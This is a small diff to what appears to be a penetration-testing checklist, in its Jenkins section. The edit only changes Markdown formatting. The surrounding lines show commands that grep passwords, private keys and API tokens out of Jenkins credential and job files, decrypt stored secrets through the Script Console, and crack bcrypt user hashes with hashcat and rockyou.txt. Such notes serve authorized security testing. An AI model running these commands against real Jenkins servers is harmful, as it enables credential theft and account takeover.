@@ -39,5 +39,5 @@ Windows, a script from Kali loaded into memory:
 grep -rhoE '<(password|passphrase|privateKey|secret|apiToken)>[^<]*' /var/lib/jenkins/credentials.xml /var/lib/jenkins/jobs/*/config.xml
 Each {AQAAAB...} value decrypted in the Script Console:
 println(hudson.util.Secret.decrypt('THE-SECRET'))
-- [ ] A #jbcrypt: hash from a user's config.xml, with #jbcrypt: cut off, into hashes.txt
+- [ ] A `#jbcrypt:` hash from a user's config.xml, with `#jbcrypt:` cut off, into hashes.txt
 hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
